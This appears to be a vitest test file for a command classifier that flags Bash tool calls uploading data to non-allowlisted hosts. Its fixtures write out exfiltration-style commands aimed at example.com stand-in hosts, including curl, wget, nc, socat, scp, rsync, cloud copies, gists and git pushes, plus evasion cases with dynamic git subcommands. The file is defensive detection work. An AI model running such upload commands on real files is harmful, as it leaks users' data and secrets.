import { describe, expect, it } from "vitest";
import { classify } from "../classify.js";
import type { ClassifiedAction, ClassifyContext } from "../types.js";

const REPO = "/home/you/projects/app";
const ctx: ClassifyContext = { home: "/home/you", readLink: () => null, readHead: () => "feat/x", readScript: () => null };

function bash(command: string): ClassifiedAction[] {
  return classify({ kind: "bash", command, cwd: REPO, toolName: "Bash", sessionId: null, toolUseId: null }, ctx);
}

describe("one fixture per bash.egress spelling", () => {
  it.each([
    ["bash.egress.gh-gist", "gh gist create notes.md --public", "gist.github.com"],
    ["bash.egress.gh-gist", "gh gist edit abc123 -a more.md", "gist.github.com"],
    ["bash.egress.curl-upload", "curl -d @report.json https://collect.example.com/in", "collect.example.com"],
    ["bash.egress.curl-upload", "curl -sS -XPOST https://paste.example.org/api", "paste.example.org"],
    ["bash.egress.curl-upload", "curl --data-binary @dump.txt paste.example.org", "paste.example.org"],
    ["bash.egress.curl-upload", "curl -F file=@notes.md https://upload.example.net", "upload.example.net"],
    ["bash.egress.curl-upload", "curl -T notes.md https://files.example.net/put", "files.example.net"],
    ["bash.egress.curl-upload", "curl -X PATCH https://files.example.net/item/1", "files.example.net"],
    ["bash.egress.curl-upload", "curl --json '{\"a\":1}' https://hooks.example.com/x", "hooks.example.com"],
    ["bash.egress.curl-upload", 'curl -d x "$ENDPOINT"', "unknown"],
    ["bash.egress.wget-upload", "wget --post-data 'a=1' https://collect.example.com/in", "collect.example.com"],
    ["bash.egress.wget-upload", "wget --post-file=notes.md https://collect.example.com/in", "collect.example.com"],
    ["bash.egress.wget-upload", "wget --method=PUT https://files.example.net/put", "files.example.net"],
    ["bash.egress.wget-upload", "wget --method=PATCH https://files.example.net/item/1", "files.example.net"],
    ["bash.egress.httpie", "http POST https://collect.example.com/in a=1", "collect.example.com"],
    ["bash.egress.httpie", "https collect.example.com/in note=@notes.md", "collect.example.com"],
    ["bash.egress.httpie", "http PUT files.example.net/x", "files.example.net"],
    ["bash.egress.raw-socket", "nc collect.example.com 9000 < notes.md", "collect.example.com"],
    ["bash.egress.raw-socket", "ncat -w 3 collect.example.com 9000", "collect.example.com"],
    ["bash.egress.raw-socket", "socat - TCP:collect.example.com:9000", "collect.example.com"],
    ["bash.egress.raw-socket", "telnet collect.example.com 23", "collect.example.com"],
    ["bash.egress.remote-copy", "scp -P 2222 notes.md you@box.example.com:/tmp/", "box.example.com"],
    ["bash.egress.remote-copy", "rsync -az -e ssh dist/ box.example.com:site/", "box.example.com"],
    ["bash.egress.remote-copy", "rsync -a dist/ rsync://mirror.example.org/drop", "mirror.example.org"],
    ["bash.egress.remote-copy", "sftp you@box.example.com", "box.example.com"],
    ["bash.egress.cloud-copy", "aws s3 cp notes.md s3://drop-bucket/notes.md", "drop-bucket"],
    ["bash.egress.cloud-copy", "aws --profile x s3 sync dist s3://site-bucket --delete", "site-bucket"],
    ["bash.egress.cloud-copy", "gsutil -m cp -r dist gs://site-bucket/", "site-bucket"],
    ["bash.egress.git-push-url", "git push https://git.example.com/you/app.git feat/x", "git.example.com"],
    ["bash.egress.git-push-url", "git push git@git.example.com:you/app.git feat/x", "git.example.com"],
  ])("%s: %s", (spelling, command, host) => {
    expect(bash(command)).toEqual([expect.objectContaining({ action: "private-egress", spelling, subject: { host } })]);
  });

  it("names each distinct off-allowlist host once", () => {
    expect(bash("curl -d x https://a.example.com/1 https://a.example.com/2 https://api.github.com/x").map((a) => a.subject)).toEqual([
      { host: "a.example.com" },
    ]);
  });
});

describe("reads and allowlisted hosts classify nothing", () => {
  it.each([
    "curl https://api.github.com/repos/o/r/pulls/3",
    "curl -sSL https://example.com/install.sh -o install.sh",
    "curl -H 'Accept: application/json' https://registry.npmjs.org/@scope%2fa",
    "curl -I https://example.com",
    "curl -X DELETE https://files.example.net/item/1",
    "curl localhost:3000 -d x",
    "curl -X POST http://127.0.0.1:8787/api/run",
    "curl -d x 'http://[::1]:4000/'",
    "curl -X POST -d @body.json https://api.github.com/repos/o/r/issues",
    "wget https://example.com/archive.tgz",
    "http GET example.com/status",
    "http example.com/search q==term Accept:application/json",
    "http :3000/api a=1",
    "nc -z localhost 3000",
    "nc -l 8080",
    "socat TCP-LISTEN:8080,fork TCP:localhost:3000",
    "scp box.example.com:/var/log/app.log ./",
    "rsync -a src/ build/",
    "aws s3 cp s3://drop-bucket/notes.md ./notes.md",
    "aws s3 ls s3://drop-bucket",
    "gsutil cp gs://site-bucket/a.txt .",
    "gh gist view abc123",
    "gh gist list",
    "git push origin feat/x",
    "git push https://github.com/you/app.git feat/x",
    "git push git@github.com:you/app.git feat/x",
  ])("%s", (command) => {
    expect(bash(command)).toEqual([]);
  });
});

describe("a git command whose subcommand word is dynamic", () => {
  it("gives the unknown destination for a read-set subcommand", () => {
    const actions = bash("Y=status; read Y < list; git $Y origin HEAD:main").filter((a) => a.spelling === "bash.egress.git-push-url");
    expect(actions.map((a) => a.subject)).toEqual([{ host: "unknown" }]);
  });

  it("gives the unknown destination for a mapfile-set subcommand (TP-1491)", () => {
    const actions = bash("Y=status; mapfile Y < list; git $Y origin HEAD:main").filter((a) => a.spelling === "bash.egress.git-push-url");
    expect(actions.map((a) => a.subject)).toEqual([{ host: "unknown" }]);
  });

  it("gives the unknown destination for a push to a dynamic remote", () => {
    const actions = bash("git push $R HEAD:main").filter((a) => a.spelling === "bash.egress.git-push-url");
    expect(actions.map((a) => a.subject)).toEqual([{ host: "unknown" }]);
  });
});
